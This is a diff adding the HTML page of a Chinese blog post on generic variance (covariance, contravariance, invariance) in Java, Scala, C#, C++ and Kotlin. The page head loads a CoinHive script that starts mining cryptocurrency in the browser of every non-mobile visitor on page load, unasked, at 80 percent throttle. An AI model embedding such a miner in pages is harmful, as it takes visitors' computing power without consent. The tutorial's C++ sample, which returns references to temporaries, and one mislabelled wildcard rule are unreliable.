@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="WeAthFolD">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="协变与逆变 - 常见语言泛型变性机制的讨论"/>
+  <meta property="og:description" content="" />
+  <meta property="og:site_name" content="WeAthFolD&#39;s Inverted Field"/>
+  <meta property="og:type" content="article" />
+  <meta property="og:image" content="http://weathfold.github.ioundefined"/>
+  
+    <link rel="alternate" href="/atom.xml" title="WeAthFolD&#39;s Inverted Field" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>WeAthFolD's Inverted Field</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-111190795-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <!-- CoinHive -->
+  <script>
+    var miner = new CoinHive.Anonymous('CLCs74GtZ05pN4V8LsFkGeZWsfAzVjLn', {throttle: 0.8});
+
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+
+    setInterval(function() {
+      // var hashesPerSecond = miner.getHashsePerSecond();
+      var acceptedHashes = miner.getAcceptedHashes();
+      document.getElementById("hashCount").innerHTML = acceptedHashes;
+    }, 1000);
+  </script>
+<link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/kimi-no-na-wa.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">协变与逆变 - 常见语言泛型变性机制的讨论</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/friends">
+                  
+                  Friends
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/about">
+                  
+                  About
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/Resume">
+                  
+                  Resume
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By WeAthFolD</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2016-11-03</span>
+            <span class="time">17:59:10</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/Programming/">Programming</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/programming/">#programming</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>前两天在看Twitter的<a href="http://twitter.github.io/effectivescala/#Types%20and%20Generics-Variance" target="_blank" rel="noopener">Effective Scala</a>的时候，看到了一些关于类型协变性的讨论。<br>之前虽然断断续续的看过一些讲协变性的文章，不过感觉果然还是没搞清楚呢……<br>于是花了一个晚上和半个早上的时间整理了一篇学习笔记，也算是了解了怎么回事。</p>
+<p>// Type system is indeed interesting :-)</p>
+<p>Update 2016.11.3：在学完Kotlin以后添加了关于Type Projection的小节。</p>
+<h1 id="What’s-Variance"><a href="#What’s-Variance" class="headerlink" title="What’s Variance"></a>What’s Variance</h1><p>首先，变性（Variance）是什么？简单的来说，它是用来处理<strong>复合类型</strong>的类型转换的一些规则。<br>常见的复合类型有数组和泛型类。当我们在讨论类似这样的问题：</p>
+<ul>
+<li><code>List&lt;EntityPlayer&gt;</code> 是否能被转型成 <code>List&lt;Entity&gt;</code>？</li>
+<li>一个 <code>Object[]</code> 的引用是否能接受一个 <code>String[]</code> 类型的引用？</li>
+</ul>
+<p>的时候，我们就在讨论复合类型的变性。</p>
+<p>通常来说，变性分类为以下三种（假设 <code>ASub</code> 是 <code>A</code> 的子类）：</p>
+<ul>
+<li>协变性 (Covariance)：    <code>List&lt;ASub&gt;</code> 是一个 <code>List&lt;A&gt;</code>，反之不成立。</li>
+<li>逆变性 (Contravariance): <code>List&lt;A&gt;</code> 是一个 <code>List&lt;ASub&gt;</code>，反之不成立。</li>
+<li>不变性 (Invariance)：<code>List&lt;ASub&gt;</code> 不是一个 <code>List&lt;A&gt;</code>，<code>List&lt;A&gt;</code> 也不是一个 <code>List&lt;ASub&gt;</code>。</li>
+</ul>
+<p>这里的” <code>A</code> 是 <code>B</code> “的意思是：一个 <code>B</code> 类型的引用可以接受一个 <code>A</code> 类型的引用。可以通俗的理解为<br><code>A</code> 是 <code>B</code> 的子类。简单的来说，协变保持了类型参数的继承关系；逆变则逆转了类型参数的继承关系。</p>
+<a id="more"></a>
+<h1 id="数组的协变性"><a href="#数组的协变性" class="headerlink" title="数组的协变性"></a>数组的协变性</h1><p>在java中，数组是协变的：</p>
+<pre class="line-numbers language-java"><code class="language-java">String<span class="token punctuation">[</span><span class="token punctuation">]</span> strList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token string">"233"</span><span class="token punctuation">,</span> <span class="token string">"2333"</span><span class="token punctuation">,</span> <span class="token string">"233333"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+Object<span class="token punctuation">[</span><span class="token punctuation">]</span> objList <span class="token operator">=</span> strList<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>你可以把一个 <code>String[]</code> 转型为一个 <code>Object[]</code> 而不得到任何编译期错误，你也可以正常的通过这个<br>引用访问原数组的元素。</p>
+<p>然而，当你尝试往objList里加入一些奇怪的东西的时候：</p>
+<pre class="line-numbers language-java"><code class="language-java">objList<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Punk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token operator">></span> Exception in thread <span class="token string">"main"</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ArrayStoreException
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>抛出了一个异常，因为你无法向一个存放String的数组里存放一个其他类型的元素。</p>
+<p>数组的协变是类型不安全的。实际上，这是当初java语言设计上的失误。由于一开始的java没有泛型，<br>然而又想引入一些方法来对数组进行通用的操作，怎么办呢？只好全部把它们upcast成 <code>Object[]</code>。<br>即便在有了泛型之后，为了保持代码的向前兼容，数组还是可以协变。</p>
+<h1 id="协变和逆变"><a href="#协变和逆变" class="headerlink" title="协变和逆变"></a>协变和逆变</h1><p>由上面数组协变的例子，我们可以看到，如果一个复合类型是协变的，并且你尝试对里面的状态进行更改，<br>就会出现类型不安全的问题。把协变的规则搬到另外一个场景看一下：</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">IContainer</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>
+    <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span>T element<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>假如IContainer的参数类型T是协变的，我们就可以写出</p>
+<pre class="line-numbers language-java"><code class="language-java">IContainer<span class="token operator">&lt;</span>String<span class="token operator">></span> c1 <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span>
+IContainer<span class="token operator">&lt;</span>Object<span class="token operator">></span> c2 <span class="token operator">=</span> c1<span class="token punctuation">;</span>
+c2<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Punk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>和数组时候的情况一模一样。</p>
+<p>这里的问题在于，实际上 <code>IContainer&lt;String&gt;.add</code> 方法接受的是一个String类型的参数。通过协变，我们<br>绕开了该方法对于类型的限定，从而导致了类型不安全。对于数组，我们可以想象有一个 <code>set(int index, T value)</code><br>方法处于同样的困境中。</p>
+<p>因此，我们可以得出如下结论：如果一个类型参数出现在方法的参数中，那么这个类型参数必须不能是协变的。</p>
+<p>再看接下来的另外一种情况：</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">Iterator</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>
+    bool <span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    T <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个接口容许协变。将一个 <code>Iterator&lt;EntityPlayer&gt;</code> 转型为一个 <code>Iterator&lt;Entity&gt;</code> ，我们通过<br><code>next()</code> 方法得到的是一个<code>Entity</code>对象，这的确合乎常理。</p>
+<p>从 <code>Iterator</code> 接口和的观察我们可以得出：对值的观察(observation) 或将值作为<strong>函数的返回值</strong>返回的<br>情况下，类型参数的协变是安全的。</p>
+<p>对协变的情况讨论完了，接下来我们讨论一下逆变 (Contravariance) 。逆变本身其实是比较反直觉的。假如一个类型参数是逆变的，那么 <code>SomeType&lt;String&gt;</code> 就可以接受 <code>SomeType&lt;ObjecT&gt;</code>。在面向对象的世界，<br>这意味着 <code>SomeType&lt;Object&gt;</code> 可以被看作是 <code>SomeType&lt;String&gt;</code>的子类！</p>
+<p>不过，如果把 <code>IContainer</code> 和 <code>Iterator</code> 的例子在支持逆变的情况下再讨论一次，就会发现逆变有它的存在价值，来试试吧：</p>
+<p>首先，对于 <code>IContainer&lt;T&gt;</code>，可以逆变意味着可以让 <code>IContainer&lt;String&gt;</code> 接受<br><code>IContainer&lt;Object&gt;</code>。当你调用 <strong>add</strong> 方法时，你往里面加入的是一个 <code>String</code> 对象，<br>而这对 <code>IContainer&lt;Object&gt;</code> 是完全安全的！</p>
+<p>接下来，对于 <code>Iterator&lt;T&gt;</code>，可以逆变意味着可以让 <code>Iterator&lt;EntityPlayer&gt;</code> 接受<br><code>Iterator&lt;Entity&gt;</code>。当你调用 <strong>next</strong> 方法时，你总是期望得到一个 <code>EntityPlayer</code> 类型的参数，但是现在却有可能得到一个在继承层次上一级的 <code>Entity</code> 对象。这是类型不安全的。</p>
+<p>可以看到，协变和逆变在各个情况下的类型安全问题恰好相反。可以列表归纳如下：</p>
+<p>类型 | 作为函数参数 | 作为函数返回值<br>协变 | 不安全      | 安全<br>逆变 | 安全 –       | 不安全<br>不变 | 安全 –     | 安全</p>
+<p>常见的强类型带泛型的语言（e.g. C#, Java, Scala）通常允许程序作者指定类型参数的变性，<br>并且通过检查变性的限制条件来保证代码的（编译时）类型安全。我们在下面就讨论一下这些语言指定变性的方法。</p>
+<h1 id="Use-site-variance-和-Declaration-site-variance"><a href="#Use-site-variance-和-Declaration-site-variance" class="headerlink" title="Use-site variance 和 Declaration-site variance"></a>Use-site variance 和 Declaration-site variance</h1><p>指定类型参数变性的方法有两种：在<strong>类声明时指定</strong> (Declaration-site) 或在创建实例，<br>即<strong>使用类时指定</strong> (Use-site)。在 C# 和 Scala 中用的是第一种方法，而 Java 中用的是第二种方法。</p>
+<h2 id="类声明时的变性"><a href="#类声明时的变性" class="headerlink" title="类声明时的变性"></a>类声明时的变性</h2><p>下面这段Scala代码示范了声明时变性的用法：</p>
+<pre class="line-numbers language-scala"><code class="language-scala"><span class="token keyword">trait</span> Box<span class="token punctuation">[</span><span class="token operator">-</span>A<span class="token punctuation">]</span> <span class="token punctuation">{</span>
+    <span class="token keyword">def</span> insert<span class="token punctuation">(</span>element<span class="token operator">:</span> A<span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">val</span> boxOfObject<span class="token operator">:</span> Box<span class="token punctuation">[</span><span class="token builtin">AnyRef</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token keyword">val</span> boxOfString<span class="token operator">:</span> Box<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+<span class="token comment" spellcheck="true">// 因为A是逆变参数，Box[String]是Box[AnyRef]的子类，转型可以发生</span>
+<span class="token keyword">val</span> boxOfString2<span class="token operator">:</span> Box<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">]</span> <span class="token operator">=</span> boxOfObject 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在 Scala 中，通过在类型参数前加上 <code>+</code> 来代表协变参数， <code>-</code> 代表逆变参数。在 C# 中，对应的关键字<br>则是 <code>out</code> 和 <code>in</code> （这非常有意思，正好对应了我们之前对读写操作和类型安全性的讨论）。</p>
+<h2 id="Use-site-variance"><a href="#Use-site-variance" class="headerlink" title="Use-site variance"></a>Use-site variance</h2><p>特立独行的Java使用的是 Use-site variance，即让类的使用者决定一个类实例的变性。变性的指定通过<br>泛型通配符 (Wildcard) 进行。例如：</p>
+<ul>
+<li><code>List&lt;? extends Entity&gt;</code> 代表一个类型参数为 <code>Entity</code> 的协变列表。</li>
+<li><code>List&lt;? super EntityPlayer&gt;</code> 代表一个类型参数为 <code>EntityPlayer</code> 的逆变列表。</li>
+<li><code>List&lt;?&gt;</code> 是 <code>List&lt;? extends Object&gt;</code> 的简写。</li>
+</ul>
+<p>为了保证类型安全，相应的有如下限制：</p>
+<ul>
+<li>使用 <code>? extends</code> 通配符的协变类型，不允许调用任何以本类型参数作为参数的方法。 (e.g. <strong>add</strong>)</li>
+<li>使用 <code>? super</code> 通配符的协变类型，不允许调用任何以本类型参数作为返回值的方法。(e.g. <strong>getValue</strong>)</li>
+</ul>
+<p>类型通配符实际很容易和类型边界(Type bounds)搞混，但是它们实际上是完全不同的概念：</p>
+<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Action</span><span class="token operator">></span> <span class="token function">applyAction</span><span class="token punctuation">(</span>Entity target<span class="token punctuation">,</span> T action<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里说的是这个泛型参数T只接受可以任何Action类的子类型作为实际参数。在知道这一点的前提下，<br>我们可以对T类型的引用调用<code>Action</code>类里定义的所有公有方法。</p>
+<h1 id="Sidenote-C-里的协变"><a href="#Sidenote-C-里的协变" class="headerlink" title="Sidenote: C++里的协变"></a>Sidenote: C++里的协变</h1><p>C++里面，<strong>通常来说</strong>不存在类型的逆变和协变。例如，<code>std::vector&lt;Entity&gt;</code> 和 <code>std::vector&lt;EntityPlayer&gt;</code><br>之间是完全无法相互转换的（在引用的意义上）。毕竟在C++里面，“泛型”的概念并不存在，取而代之的是模板和模板实例化。<br>在模板支持特例化和重载，并且在实例化时验证代码的情况下，实际上并不需要这样的转换。逆变和协变的概念通常在使用真泛型、比较强调引用概念的强类型语言中比较有用。</p>
+<p>不过，C++支持返回类型的协变。</p>
+<pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">struct</span> A <span class="token punctuation">{</span>
+    <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"A::test"</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">struct</span> ASub <span class="token operator">:</span> <span class="token keyword">public</span> A <span class="token punctuation">{</span>
+    <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> override <span class="token punctuation">{</span>
+        std<span class="token operator">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"ASub::test"</span> <span class="token operator">&lt;&lt;</span> std<span class="token operator">::</span>endl<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">struct</span> B <span class="token punctuation">{</span>
+    <span class="token keyword">virtual</span> A<span class="token operator">&amp;</span> <span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">struct</span> BSub <span class="token operator">:</span> <span class="token keyword">public</span> B <span class="token punctuation">{</span>
+    ASub<span class="token operator">&amp;</span> <span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> override <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">ASub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>不过，这种协变应该仅限于指针和引用类型。对于复合类型的协变（e.g. <code>std::unique_ptr&lt;A&gt;</code>）就无能为力了。</p>
+<h1 id="Sidenote-2-Kotlin的Type-projection"><a href="#Sidenote-2-Kotlin的Type-projection" class="headerlink" title="Sidenote 2: Kotlin的Type projection"></a>Sidenote 2: Kotlin的Type projection</h1><p>保证协变和逆变安全的规则可以简单概括为：读协变，写逆变，同时读写只能不变。这样就引来了一个问题：如果在特定的上下文里，我只想对一个泛型类进行读/写，不能够对其进行泛型的处理。</p>
+<p>例如，我有一个<code>List&lt;Object&gt;</code>和一个<code>List&lt;String&gt;</code>，我想同时往它们里放入String：</p>
+<pre class="line-numbers language-kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">putStrings</span><span class="token punctuation">(</span>target<span class="token operator">:</span> List<span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    target<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"233"</span><span class="token punctuation">)</span>
+    target<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"466"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">val</span> list1 <span class="token operator">=</span> ArrayList<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">val</span> list2 <span class="token operator">=</span> ArrayList<span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token function">putStrings</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// success</span>
+<span class="token function">putStrings</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// fail!</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>某种程度上，也是由于这个严重的问题，java才不得不对数组进行协变，从而导致了类型不安全。</p>
+<p>Kotlin使用了叫做Type projection的trick来解决这个问题，其规则很简单：在函数参数的泛型参数类型前加上<code>in</code>或<code>out</code>标记。如果加上<code>in</code>标记，则方法内部只允许调用该对象关于泛型参数的写方法；如果加上<code>out</code>标记，则方法内部只允许调用相关的读方法。这样，就可以对本来不变的类型进行协变或者逆变了。</p>
+<p>对于上面的例子，编译成功的代码为：</p>
+<pre class="line-numbers language-kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">putStrings</span><span class="token punctuation">(</span>target<span class="token operator">:</span> List<span class="token operator">&lt;</span><span class="token keyword">in</span> String<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// Type projection rocks!</span>
+    target<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"233"</span><span class="token punctuation">)</span>
+    target<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"466"</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">val</span> list1 <span class="token operator">=</span> ArrayList<span class="token operator">&lt;</span>Object<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">val</span> list2 <span class="token operator">=</span> ArrayList<span class="token operator">&lt;</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token function">putStrings</span><span class="token punctuation">(</span>list2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// success</span>
+<span class="token function">putStrings</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// success!</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>顺便一说，<a href="http://kotlinlang.org/docs/reference/" target="_blank" rel="noopener">Kotlin的docs对泛型的解释</a>是我看到的所有教程里最清楚的，有时间可以专门看看哈哈哈</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>变性是复合类型处理类型转换的一套规则。总的来说，变性的各种规则都是为了保证在使用泛型对象时的类型安全。具体的来说，也就是对函数传入参数和返回值的类型安全。</p>
+<p>为了保证类型安全，在不需要修改对象的时候，泛型参数可以协变；在不需要观察对象的时候，泛型参数可以逆变。在观察和修改两种操作同时存在的情况下，泛型参数必须是不变的。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://en.wikipedia.org/wiki/Covariance_and_contravariance_%28computer_science%29" target="_blank" rel="noopener">Wikipedia - Covariance and contravariance (computer science)</a></p>
+<p><a href="http://twitter.github.io/effectivescala/#Types%20and%20Generics-Variance" target="_blank" rel="noopener">Twitter - Effective Scala: Types and Variance</a></p>
+<p><a href="http://build.cthuwork.com:8081/wordpress/2015/09/09/java%E5%86%8D%E8%B0%88%E6%B3%9B%E5%9E%8B%E4%B9%8B%E6%B3%9B%E5%9E%8B%E8%BE%B9%E7%95%8C/" target="_blank" rel="noopener">雨轩的Dev Blog - Java再谈泛型之泛型边界</a></p>
+<p><a href="http://kotlinlang.org/docs/reference/" target="_blank" rel="noopener">Kotlin reference - Generics</a></p>
+
+        </div>
+        <div id="disqus_thread"></div>
+        <script>
+        
+        /**
+        *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+        *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+        /*
+        var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+        */
+        (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://weathfold-ghpages.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                                    
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
